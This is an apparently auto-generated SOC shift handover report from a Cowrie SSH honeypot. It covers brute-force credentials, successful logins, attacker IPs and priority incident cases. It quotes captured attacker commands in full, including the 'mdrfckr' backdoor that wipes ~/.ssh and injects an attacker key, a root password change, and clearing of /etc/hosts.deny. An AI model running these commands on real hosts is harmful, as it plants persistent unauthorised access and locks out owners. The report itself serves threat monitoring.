# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-29 |
| **Generated At** | 2026-03-29T20:29:52Z |
| **Shift Time** | 20:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **41** |
| False Positives Filtered | **5** (10.9%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **16** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **37** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **14** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 4 |
| `oracle` | 3 |
| `postgres` | 2 |
| `config` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 3 |
| `admin` | 2 |
| `123` | 1 |
| `laserjet` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `admin` | 2 |
| `config` | `123` | 1 |
| `root` | `laserjet` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `laserjet` | `45.195.221.26` | 2026-03-29T18:43:56 |
| `root` | `3245gs5662d34` | `45.195.221.26` | 2026-03-29T18:44:00 |
| `root` | `admin` | `23.129.64.164` | 2026-03-29T19:21:09 |
| `root` | `admin` | `59.24.226.8` | 2026-03-29T19:25:56 |
| `root` | `root001` | `14.103.117.98` | 2026-03-29T19:45:26 |
| `root` | `3245gs5662d34` | `14.103.117.98` | 2026-03-29T19:45:30 |
| `root` | `osmosis` | `103.23.198.244` | 2026-03-29T19:48:22 |
| `root` | `3245gs5662d34` | `103.23.198.244` | 2026-03-29T19:48:28 |
| `root` | `dongdong` | `101.126.157.138` | 2026-03-29T20:11:33 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IFLqjUKpyQ4e"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.157.138`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.195.221.26`, `103.23.198.244`, `14.103.117.98`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **28** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4f906c270ac1

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-03-29 18:43 |
| **Last Seen** | 2026-03-29 18:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 18:43:55` | `cowrie.session.connect` |
| `2026-03-29 18:43:55` | `cowrie.client.version` |
| `2026-03-29 18:43:55` | `cowrie.client.kex` |
| `2026-03-29 18:43:56` | `cowrie.login.success` |
| `2026-03-29 18:43:56` | `cowrie.session.params` |
| `2026-03-29 18:43:56` | `cowrie.command.input` |
| `2026-03-29 18:43:56` | `cowrie.command.failed` |
| `2026-03-29 18:43:56` | `cowrie.log.closed` |
| `2026-03-29 18:43:57` | `cowrie.session.params` |
| `2026-03-29 18:43:57` | `cowrie.command.input` |
| `2026-03-29 18:43:57` | `cowrie.session.file_download` |
| `2026-03-29 18:43:57` | `cowrie.log.closed` |
| `2026-03-29 18:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f8802aa692

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-03-29 18:43 |
| **Last Seen** | 2026-03-29 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 18:43:59` | `cowrie.session.connect` |
| `2026-03-29 18:43:59` | `cowrie.client.version` |
| `2026-03-29 18:43:59` | `cowrie.client.kex` |
| `2026-03-29 18:44:00` | `cowrie.login.success` |
| `2026-03-29 18:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2351a75609b0

| Field | Detail |
|---|---|
| **Source IP** | `23.129.64[.]164` |
| **First Seen** | 2026-03-29 19:21 |
| **Last Seen** | 2026-03-29 19:21 |
| **Session Duration** | 25s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 19:21:06` | `cowrie.session.connect` |
| `2026-03-29 19:21:06` | `cowrie.client.version` |
| `2026-03-29 19:21:06` | `cowrie.client.kex` |
| `2026-03-29 19:21:08` | `cowrie.client.fingerprint` |
| `2026-03-29 19:21:08` | `cowrie.login.failed` |
| `2026-03-29 19:21:09` | `cowrie.login.success` |
| `2026-03-29 19:21:30` | `cowrie.direct-tcpip.request` |
| `2026-03-29 19:21:30` | `cowrie.direct-tcpip.ja4` |
| `2026-03-29 19:21:30` | `cowrie.direct-tcpip.data` |
| `2026-03-29 19:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.129.64[.]164` to AbuseIPDB if not already reported
- [ ] Block `23.129.64[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c1c7551e094

| Field | Detail |
|---|---|
| **Source IP** | `59.24.226[.]8` |
| **First Seen** | 2026-03-29 19:25 |
| **Last Seen** | 2026-03-29 19:26 |
| **Session Duration** | 63s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 19:25:53` | `cowrie.session.connect` |
| `2026-03-29 19:25:53` | `cowrie.client.version` |
| `2026-03-29 19:25:54` | `cowrie.client.kex` |
| `2026-03-29 19:25:54` | `cowrie.login.failed` |
| `2026-03-29 19:25:56` | `cowrie.login.success` |
| `2026-03-29 19:25:56` | `cowrie.session.params` |
| `2026-03-29 19:25:56` | `cowrie.command.input` |
| `2026-03-29 19:25:56` | `cowrie.command.failed` |
| `2026-03-29 19:25:56` | `cowrie.log.closed` |
| `2026-03-29 19:25:56` | `cowrie.session.params` |
| `2026-03-29 19:25:56` | `cowrie.command.input` |
| `2026-03-29 19:25:57` | `cowrie.log.closed` |
| `2026-03-29 19:25:57` | `cowrie.session.params` |
| `2026-03-29 19:25:57` | `cowrie.command.input` |
| `2026-03-29 19:25:57` | `cowrie.log.closed` |
| `2026-03-29 19:25:57` | `cowrie.session.params` |
| `2026-03-29 19:25:57` | `cowrie.command.input` |
| `2026-03-29 19:25:57` | `cowrie.log.closed` |
| `2026-03-29 19:25:58` | `cowrie.session.params` |
| `2026-03-29 19:25:58` | `cowrie.command.input` |
| `2026-03-29 19:25:58` | `cowrie.log.closed` |
| `2026-03-29 19:25:58` | `cowrie.session.params` |
| `2026-03-29 19:25:58` | `cowrie.command.input` |
| `2026-03-29 19:25:58` | `cowrie.log.closed` |
| `2026-03-29 19:25:59` | `cowrie.session.params` |
| `2026-03-29 19:25:59` | `cowrie.command.input` |
| `2026-03-29 19:25:59` | `cowrie.log.closed` |
| `2026-03-29 19:25:59` | `cowrie.session.params` |
| `2026-03-29 19:25:59` | `cowrie.command.input` |
| `2026-03-29 19:25:59` | `cowrie.log.closed` |
| `2026-03-29 19:26:00` | `cowrie.session.params` |
| `2026-03-29 19:26:00` | `cowrie.command.input` |
| `2026-03-29 19:26:00` | `cowrie.log.closed` |
| `2026-03-29 19:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.24.226[.]8` to AbuseIPDB if not already reported
- [ ] Block `59.24.226[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e49c965b7154

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]98` |
| **First Seen** | 2026-03-29 19:45 |
| **Last Seen** | 2026-03-29 19:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 19:45:25` | `cowrie.session.connect` |
| `2026-03-29 19:45:25` | `cowrie.client.version` |
| `2026-03-29 19:45:25` | `cowrie.client.kex` |
| `2026-03-29 19:45:26` | `cowrie.login.success` |
| `2026-03-29 19:45:26` | `cowrie.session.params` |
| `2026-03-29 19:45:26` | `cowrie.command.input` |
| `2026-03-29 19:45:26` | `cowrie.command.failed` |
| `2026-03-29 19:45:27` | `cowrie.log.closed` |
| `2026-03-29 19:45:27` | `cowrie.session.params` |
| `2026-03-29 19:45:27` | `cowrie.command.input` |
| `2026-03-29 19:45:27` | `cowrie.session.file_download` |
| `2026-03-29 19:45:27` | `cowrie.log.closed` |
| `2026-03-29 19:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22ff2c28940

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]98` |
| **First Seen** | 2026-03-29 19:45 |
| **Last Seen** | 2026-03-29 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 19:45:29` | `cowrie.session.connect` |
| `2026-03-29 19:45:29` | `cowrie.client.version` |
| `2026-03-29 19:45:30` | `cowrie.client.kex` |
| `2026-03-29 19:45:30` | `cowrie.login.success` |
| `2026-03-29 19:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ca85657872

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]244` |
| **First Seen** | 2026-03-29 19:48 |
| **Last Seen** | 2026-03-29 19:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 19:48:21` | `cowrie.session.connect` |
| `2026-03-29 19:48:21` | `cowrie.client.version` |
| `2026-03-29 19:48:21` | `cowrie.client.kex` |
| `2026-03-29 19:48:22` | `cowrie.login.success` |
| `2026-03-29 19:48:22` | `cowrie.session.params` |
| `2026-03-29 19:48:22` | `cowrie.command.input` |
| `2026-03-29 19:48:22` | `cowrie.command.failed` |
| `2026-03-29 19:48:23` | `cowrie.log.closed` |
| `2026-03-29 19:48:24` | `cowrie.session.params` |
| `2026-03-29 19:48:24` | `cowrie.command.input` |
| `2026-03-29 19:48:24` | `cowrie.session.file_download` |
| `2026-03-29 19:48:24` | `cowrie.log.closed` |
| `2026-03-29 19:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2414098f5b

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]244` |
| **First Seen** | 2026-03-29 19:48 |
| **Last Seen** | 2026-03-29 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 19:48:27` | `cowrie.session.connect` |
| `2026-03-29 19:48:27` | `cowrie.client.version` |
| `2026-03-29 19:48:27` | `cowrie.client.kex` |
| `2026-03-29 19:48:28` | `cowrie.login.success` |
| `2026-03-29 19:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488689123efd

| Field | Detail |
|---|---|
| **Source IP** | `101.126.157[.]138` |
| **First Seen** | 2026-03-29 20:11 |
| **Last Seen** | 2026-03-29 20:12 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IFLqjUKpyQ4e"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 20:11:31` | `cowrie.session.connect` |
| `2026-03-29 20:11:31` | `cowrie.client.version` |
| `2026-03-29 20:11:32` | `cowrie.client.kex` |
| `2026-03-29 20:11:33` | `cowrie.login.success` |
| `2026-03-29 20:11:34` | `cowrie.session.params` |
| `2026-03-29 20:11:34` | `cowrie.command.input` |
| `2026-03-29 20:11:34` | `cowrie.command.failed` |
| `2026-03-29 20:11:34` | `cowrie.log.closed` |
| `2026-03-29 20:11:34` | `cowrie.session.params` |
| `2026-03-29 20:11:34` | `cowrie.command.input` |
| `2026-03-29 20:11:35` | `cowrie.session.file_download` |
| `2026-03-29 20:11:35` | `cowrie.log.closed` |
| `2026-03-29 20:11:47` | `cowrie.session.params` |
| `2026-03-29 20:11:47` | `cowrie.command.input` |
| `2026-03-29 20:11:47` | `cowrie.log.closed` |
| `2026-03-29 20:11:48` | `cowrie.session.params` |
| `2026-03-29 20:11:48` | `cowrie.command.input` |
| `2026-03-29 20:11:48` | `cowrie.log.closed` |
| `2026-03-29 20:11:48` | `cowrie.session.params` |
| `2026-03-29 20:11:48` | `cowrie.command.input` |
| `2026-03-29 20:11:49` | `cowrie.session.file_download` |
| `2026-03-29 20:11:49` | `cowrie.log.closed` |
| `2026-03-29 20:11:50` | `cowrie.session.params` |
| `2026-03-29 20:11:50` | `cowrie.command.input` |
| `2026-03-29 20:11:50` | `cowrie.log.closed` |
| `2026-03-29 20:11:51` | `cowrie.session.params` |
| `2026-03-29 20:11:51` | `cowrie.command.input` |
| `2026-03-29 20:11:51` | `cowrie.log.closed` |
| `2026-03-29 20:11:52` | `cowrie.session.params` |
| `2026-03-29 20:11:52` | `cowrie.command.input` |
| `2026-03-29 20:11:52` | `cowrie.command.input` |
| `2026-03-29 20:11:53` | `cowrie.log.closed` |
| `2026-03-29 20:11:53` | `cowrie.session.params` |
| `2026-03-29 20:11:53` | `cowrie.command.input` |
| `2026-03-29 20:11:53` | `cowrie.log.closed` |
| `2026-03-29 20:11:54` | `cowrie.session.params` |
| `2026-03-29 20:11:54` | `cowrie.command.input` |
| `2026-03-29 20:11:54` | `cowrie.log.closed` |
| `2026-03-29 20:11:55` | `cowrie.session.params` |
| `2026-03-29 20:11:55` | `cowrie.command.input` |
| `2026-03-29 20:11:55` | `cowrie.log.closed` |
| `2026-03-29 20:11:56` | `cowrie.session.params` |
| `2026-03-29 20:11:56` | `cowrie.command.input` |
| `2026-03-29 20:11:56` | `cowrie.log.closed` |
| `2026-03-29 20:11:57` | `cowrie.session.params` |
| `2026-03-29 20:11:57` | `cowrie.command.input` |
| `2026-03-29 20:11:57` | `cowrie.log.closed` |
| `2026-03-29 20:11:57` | `cowrie.session.params` |
| `2026-03-29 20:11:57` | `cowrie.command.input` |
| `2026-03-29 20:11:58` | `cowrie.log.closed` |
| `2026-03-29 20:11:58` | `cowrie.session.params` |
| `2026-03-29 20:11:58` | `cowrie.command.input` |
| `2026-03-29 20:11:59` | `cowrie.log.closed` |
| `2026-03-29 20:12:00` | `cowrie.session.params` |
| `2026-03-29 20:12:00` | `cowrie.command.input` |
| `2026-03-29 20:12:01` | `cowrie.log.closed` |
| `2026-03-29 20:12:01` | `cowrie.session.params` |
| `2026-03-29 20:12:01` | `cowrie.command.input` |
| `2026-03-29 20:12:01` | `cowrie.log.closed` |
| `2026-03-29 20:12:02` | `cowrie.session.params` |
| `2026-03-29 20:12:02` | `cowrie.command.input` |
| `2026-03-29 20:12:02` | `cowrie.log.closed` |
| `2026-03-29 20:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.157[.]138` to AbuseIPDB if not already reported
- [ ] Block `101.126.157[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.53.99[.]37` | **3** | 2026-03-29 19:08 | 2026-03-29 19:09 | 2m | 0 | `T1592` | 🟢 LOW |
| `18.191.16[.]102` | **3** | 2026-03-29 19:23 | 2026-03-29 19:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.157[.]138` | **2** | 2026-03-29 20:11 | 2026-03-29 20:12 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `13.89.125[.]231` | **2** | 2026-03-29 19:49 | 2026-03-29 19:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | **2** | 2026-03-29 18:57 | 2026-03-29 19:33 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.23.198[.]244` | 1 | 2026-03-29 19:48 | 2026-03-29 19:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.230.176[.]152` | 1 | 2026-03-29 19:50 | 2026-03-29 19:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.251.31[.]26` | 1 | 2026-03-29 18:44 | 2026-03-29 18:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.161.164[.]24` | 1 | 2026-03-29 19:01 | 2026-03-29 19:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.117[.]98` | 1 | 2026-03-29 19:45 | 2026-03-29 19:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `164.92.168[.]97` | 1 | 2026-03-29 18:42 | 2026-03-29 18:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `180.184.52[.]206` | 1 | 2026-03-29 18:45 | 2026-03-29 18:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.92.11[.]80` | 1 | 2026-03-29 20:11 | 2026-03-29 20:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.189.124[.]218` | 1 | 2026-03-29 18:51 | 2026-03-29 18:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.239.181[.]182` | 1 | 2026-03-29 18:51 | 2026-03-29 18:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.253.10[.]61` | 1 | 2026-03-29 19:11 | 2026-03-29 19:11 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.156.49[.]27` | 1 | 2026-03-29 19:03 | 2026-03-29 19:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.195.221[.]26` | 1 | 2026-03-29 18:43 | 2026-03-29 18:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
